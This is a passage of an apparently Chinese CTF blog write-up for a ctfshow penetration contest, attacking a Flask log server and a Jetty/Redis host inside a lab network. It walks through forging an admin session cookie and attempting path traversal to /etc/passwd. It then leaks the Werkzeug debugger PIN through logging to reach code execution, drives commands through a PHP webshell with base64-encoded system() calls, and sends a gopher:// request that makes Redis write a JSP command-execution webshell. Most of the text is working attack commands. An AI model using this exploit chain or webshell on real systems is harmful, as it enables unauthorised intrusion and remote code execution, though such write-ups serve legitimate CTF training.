<span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log server is running'</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">check_session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'user'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/key'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/log_server_key.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            key <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'key'</span><span class="token punctuation">,</span> <span class="token string">'key'</span><span class="token punctuation">:</span> key<span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只需要伪造 session 为 admin 就行了：<code>eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU</code></p><p>但是在哪传呢，测了一下发现任务中心不出网</p><p>看来要把php那台机子拿下shell才能打</p><p>开了debug模式，可以访问console</p><br><p>php那台服务器有curl，直接curl就行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250106174441782.png" alt="image-20250106174441782"></p><p>flag：<code>ctfshow&#123;4f5d1d5d-1d5d-1d5d1d5d1d5d&#125;</code></p><hr><h2 id="顺藤摸瓜（复现）"><a href="#顺藤摸瓜（复现）" class="headerlink" title="顺藤摸瓜（复现）"></a>顺藤摸瓜（复现）</h2><p>接下来关注这个：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/set_log_option'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_log_option</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logName <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logName'</span><span class="token punctuation">)</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    app_log <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span>logName<span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    app_log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>INFO<span class="token punctuation">)</span>    clear_log_file<span class="token punctuation">(</span><span class="token string">'./log/'</span> <span class="token operator">+</span> logFile<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log option set successfully'</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/get_log_content'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_log_content</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> check_session<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"not authorized"</span><span class="token punctuation">&#125;</span>    logFile <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'logFile'</span><span class="token punctuation">)</span>    path <span class="token operator">=</span> join<span class="token punctuation">(</span><span class="token string">'log'</span><span class="token punctuation">,</span> basename<span class="token punctuation">(</span>logFile<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token string">'message'</span><span class="token punctuation">:</span> <span class="token string">'log content'</span><span class="token punctuation">,</span> <span class="token string">'content'</span><span class="token punctuation">:</span> content<span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">clear_log_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造curl</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/set_log_option?logFile<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd%2526logName<span class="token operator">=</span><span class="token number">1</span><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.227.6:8888/get_log_content?logFile<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>尝试利用<code>clear_log_file</code>直接读 &#x2F;etc&#x2F;passwd，但是前面要写日志到文件中，明显权限不足</p><p>想到还有 console，但是没有PIN码，怎么办呢</p><p>因为这里有 logging 库，可以把控制台打印的东西保存下来，而我们访问<code>/console?__debugger__=yes&amp;cmd=printpin&amp;s=SECRET</code>时会把PIN码打印在控制台，那么就可以把PIN码写到日志</p><p>那么先获取console的key，直接访问console，在返回的html中就有：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.186.6:8888/console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113120057969.png" alt="image-20250113120057969"></p><p>然后设置日志文件路径：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.186.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">'curl -b  "session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3CODA.xtpnmtcEw-pXdixnj36DDm51-FY" "http://172.2.186.6:8888/set_log_option%3flogName=werkzeug%2526logFile=main.log"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来使控制台打印出PIN码写到日志中：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span>  <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> http://172.2.186.6:8888/console?__debugger__<span class="token operator">=</span>yes<span class="token operator">&amp;</span><span class="token assign-left variable">cmd</span><span class="token operator">=</span>printpin<span class="token operator">&amp;</span><span class="token assign-left variable">s</span><span class="token operator">=</span>64cjjJmRmKNv647oy994<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里可以对命令进行编码来避免解码问题</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment">//172.2.186.5/1.php?1=system(base64_decode('Y3VybCAtYiAgInNlc3Npb249ZXlKMWMyVnlJam9pWVdSdGFXNGlmUS5aM2ZSb2cuakRhSXlvQzlzcGF6QUprZ2N3UUlhcGtHSXhVIiAiaHR0cDovLzE3Mi4yLjE4Ni42Ojg4ODgvY29uc29sZT9fX2RlYnVnZ2VyX189eWVzJmNtZD1wcmludHBpbiZzPTY0Y2pqSm1SbUtOdjY0N295OTk0Ig=='));</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后读取日志</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token number">172.2</span>.186.6:8888/get_log_content?logFile<span class="token operator">=</span>main.log<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113120555016.png" alt="image-20250113120555016"></p><p>得到PIN码 606-570-039</p><p>然后进行PIN验证：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=606-570-039&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.186.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtYiAic2Vzc2lvbj1leUoxYzJWeUlqb2lZV1J0YVc0aWZRLlozZlJvZy5qRGFJeW9DOXNwYXpBSmtnY3dRSWFwa0dJeFUiICJodHRwOi8vMTcyLjIuMTg2LjY6ODg4OC9jb25zb2xlP19fZGVidWdnZXJfXz15ZXMmY21kPXBpbmF1dGgmcGluPTYwNi01NzAtMDM5JnM9NjRjampKbVJtS052NjQ3b3k5OTQi'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113121001352.png" alt="image-20250113121001352"></p><p>验证通过，需要用<code>curl -c</code>来保存cookie</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-c</span> cookie.txt <span class="token parameter variable">-b</span> <span class="token string">"session=eyJ1c2VyIjoiYWRtaW4ifQ.Z3fRog.jDaIyoC9spazAJkgcwQIapkGIxU"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=pinauth&amp;pin=606-570-039&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问跳板机上的cookie.txt</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113121452111.png" alt="image-20250113121452111"></p><p>然后带着这个cookie去就可以rce了，这里直接文件读取了</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-b</span>  <span class="token string">"__wzdb4206e39743d62f78f25=1736741655|a7b6c7c8a2a5"</span> <span class="token string">"http://172.2.186.6:8888/console?__debugger__=yes&amp;cmd=open('/etc/passwd','r').read()&amp;frm=0&amp;s=64cjjJmRmKNv647oy994"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113122334237.png" alt="image-20250113122334237"></p><p>flag：<code>ctfshow&#123;ctfer:x:1000:1000::/home/ctfer:/bin/bash&#125;</code></p><hr><h1 id="第五章（Jetty）"><a href="#第五章（Jetty）" class="headerlink" title="第五章（Jetty）"></a>第五章（Jetty）</h1><h2 id="艰难的最后一步"><a href="#艰难的最后一步" class="headerlink" title="艰难的最后一步"></a>艰难的最后一步</h2><p>那这章就是 jetty 服务了：172.2.xxx.7:8080</p><p>参考：<a href="https://xz.aliyun.com/t/11821">https://xz.aliyun.com/t/11821</a></p><p>测试读到 web.xml</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250104011242035.png" alt="image-20250104011242035"></p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">web-app</span> <span class="token name">PUBLIC</span><span class="token string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span><span class="token string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> <span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>Archetype Created Web Application<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token comment">&lt;!-- 环境参数 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.host<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>localhost<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.port<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.Integer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>6380<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>ctfshow_2025<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>redis.timeout<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.Integer<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>10000<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-name</span><span class="token punctuation">></span></span>app_root<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-type</span><span class="token punctuation">></span></span>java.lang.String<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>env-entry-value</span><span class="token punctuation">></span></span>/opt/jetty/webapps/ROOT/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry-value</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>env-entry</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag：<code>ctfshow&#123;ctfshow_2025&#125;</code></p><hr><h2 id="功亏一篑（复现）"><a href="#功亏一篑（复现）" class="headerlink" title="功亏一篑（复现）"></a>功亏一篑（复现）</h2><p>一开始是想在php跳板机上写一个 php 打 gopher 到 redis 上</p><p>但是发现 curl 是支持 <code>dict://</code> 协议和<code>gopher://</code>协议的</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token string">"dict://172.2.132.7:6380/auth:ctfshow_2025"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtdiAiZGljdDovLzE3Mi4yLjEzMi43OjYzODAvYXV0aDpjdGZzaG93XzIwMjUi'</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20250113123016886.png" alt="image-20250113123016886"></p><p>直接构造 gopher 请求包写jsp马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">auth ctfshow_2025<span class="token builtin class-name">set</span> mars <span class="token string">"&lt;% Runtime.getRuntime().exec(new String[]&#123;<span class="token entity" title="\&quot;">\"</span>sh<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>-c<span class="token entity" title="\&quot;">\"</span>,request.getParameter(<span class="token entity" title="\&quot;">\"</span>cmd<span class="token entity" title="\&quot;">\"</span>)&#125;);%>"</span>config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /opt/jetty/webapps/ROOT/config <span class="token builtin class-name">set</span> dbfilename <span class="token number">2</span>.jspsavequit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>url编码然后发送</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-v</span> <span class="token string">"gopher://172.2.132.7:6380/_auth%20ctfshow_2025%0Aset%20mars%20%22%3C%25%20Runtime.getRuntime().exec(new%20String%5B%5D%7B%5C%22sh%5C%22%2C%5C%22-c%5C%22%2Crequest.getParameter(%5C%22cmd%5C%22)%7D)%3B%25%3E%22%0Aconfig%20set%20dir%20%2Fopt%2Fjetty%2Fwebapps%2FROOT%2F%0Aconfig%20set%20dbfilename%202.jsp%0Asave%0Aquit"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://172.2.132.5/1.php?1<span class="token operator">=</span>system<span class="token punctuation">(</span>base64_decode<span class="token punctuation">(</span><span class="token string">'Y3VybCAtdiAiZ29waGVyOi8vMTcyLjIuMTMyLjc6NjM4MC9fYXV0aCUyMGN0ZnNob3dfMjAyNSUwQXNldCUyMG1hcnMlMjAlMjIlM0MlMjUlMjBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKG5ldyUyMFN0cmluZyU1QiU1RCU3QiU1QyUyMnNoJTVDJTIyJTJDJTVDJTIyLWMlNUMlMjIlMkNyZXF1ZXN0LmdldFBhcmFtZXRlciglNUMlMjJjbWQlNUMlMjIpJTdEKSUzQiUyNSUzRSUyMiUwQWNvbmZpZyUyMHNldCUyMGRpciUyMCUyRm9wdCUyRmpldHR5JTJGd2ViYXBwcyUyRlJPT1QlMkYlMEFjb25maWclMjBzZXQlMjBkYmZpbGVuYW1lJTIwMi5qc3AlMEFzYXZlJTBBcXVpdCI='</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" 